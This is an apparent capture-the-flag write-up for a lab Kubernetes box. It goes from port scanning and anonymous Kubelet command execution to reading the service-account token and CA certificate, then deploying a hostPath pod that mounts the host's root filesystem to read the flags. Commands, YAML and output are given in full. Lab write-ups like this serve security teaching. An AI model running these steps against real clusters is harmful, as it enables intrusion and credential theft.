# SteamClout - Linux, easy (10.10.11.133)

# Enumeration
```
PORT      STATE SERVICE
22/tcp    open  ssh
2379/tcp  open  etcd-client
2380/tcp  open  etcd-server
8443/tcp  open  https-alt
10249/tcp open  unknown
10250/tcp open  unknown
10256/tcp open  unknown
```

On port 2379 and 2380 we have **etcd**, which is a **kubernetes** component, where in the first port we have a client and in the second a server.
**Kubelet**, a kubernetes extension listen on port 10250 by default, and the kubernetes API listens on port 8443.

Note that if we visit the HTTP version of the website, we receive the following message: `Client sent an HTTP request to an HTTPS server.`, so in order to access the content of the websites we need to use HTTPS.

We can check the Kubernetes API on port 8443 with: `curl https://10.10.11.133:8443/ -k`:
```
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {
    
  },
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {
    
  },
  "code": 403
}
```

But as the output shows, we cannot access the home path without authenticating, so let's continue on to the Kubelet service, which is listening at port 10250, `curl https://10.10.11.133:10250/pods -k`:
```
"kind":"PodList","apiVersion":"v1","metadata":{},"items":[{"metadata":{"name":"storage-provisioner","namespace":"kube-system","uid":"bfb42524-
3853-41cd-a814-667ac23423c9","resourceVersion":"402","creationTimestamp":"2022-08-20T11:58:29Z","labels":{"addonmanager.kubernetes.io/mode":"Re
concile","integration-test":"storage-provisioner"},"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"
kind\":\"Pod\",\"metadata\":{\"annotations\":{},\
...
```

We are able to extract all the pods from the k8s cluster.
This service has a lot of undocumented API, but fortunately, we can utilize [kubelectl](https://github.com/cyberark/kubeletctl) to interface with it and discover a means to get inside a pod.
Download and install kubelectl:
```
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.8/kubeletctl_linux_amd64 && chmod a+x ./kubeletctl_linux_amd64 && mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
chmod a+x ./kubeletctl_linux_amd64
mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```

Now we can use kubelectl to obtain all the pods with `kubelectl --server 10.10.11.133 pods`:
```
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ kube-proxy-j9f5w                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ coredns-78fcd69978-lgl7z           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
```

We already know that Nginx exists solely in the default namespace and is not a Kubernetes related pod. Because Kubernetes allows anonymous access, we may use the commands /run, /exec and /cri but Curl will not work because it only allows web socket connections.
But we can utilize the `scan rce` command provided by kubelectl to determine whether we can run command on any pods.
```
kali@kali:~$ kubelectl --server 10.10.11.133 scan rce
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.10.11.133 │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
...
```

So, commands can be executed on the Nginx pod, let's see if we can run command `id` within Nginx:
```
kali@kali:~$ kubelectl --server 10.10.11.133 exec "id" -p nginx -c nginx
uid=0(root) gid=0(root) groups=0(root)
```

The command executed successfully, however it seems that there is no user flag on this pod!

### Privesc
Now that we've successfully executed a command within the Nginx pod, let's see if we can get access to tokens and certificates so that we can create a service account with higher privileges:
```
kubeletctl --server 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx 
kubeletctl --server 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx
```

We can utilize the obtained token and certificate to log in to **Kubectl**(Kubernetes command-line tool, allows to run commands against Kubernetes clusters) and check which permissions we have.
Let's save the certification in a file (`ca.crt`) and export the token as an environmental variable (`export token="eyJhbGciOiJSUz..."`).
```
kali@kali:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 get pods
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          35m
```

The default service account appears to have some basic rights, so let's list them all using `auth can-i`:
```
kali@kali:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
```

At this point, we can acquire, list, and create a pod in the default namespace!
To make a pod, we may use the nginx image, so, let's make a nefarious pod.
Save the following YAML configuration (YAML is a digestible data serialization language often used to create configuration files with any programming language) inside a file called `f.yaml`:
```
apiVersion: v1
kind: Pod
metadata:
  name: nginxt
  namespace: default
spec:
  containers:
  - name: nginxt
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

We're using the same Nginx image and mounting the host file system within the container so we can access it. We can use Kubelectl to run commands withing the pod once we've create it. Let's try applying the configuration and listing to see if our newly generated pod is up and running:
```
kali@kali:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 apply -f f.yaml 
pod/nginxt created

kali@kali:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 get pods
NAME     READY   STATUS    RESTARTS   AGE
nginx    1/1     Running   0          43m
nginxt   1/1     Running   0          60s
```

Our pod is up and running, so now we can proceed to grab both the user and root flags:
```
kubelectl --server 10.10.11.133 exec "cat /root/home/user/user.txt" -p nginxt -c nginxt

kubelectl --server 10.10.11.133 exec "cat /root/root/root.txt" -p nginxt -c nginxt
```
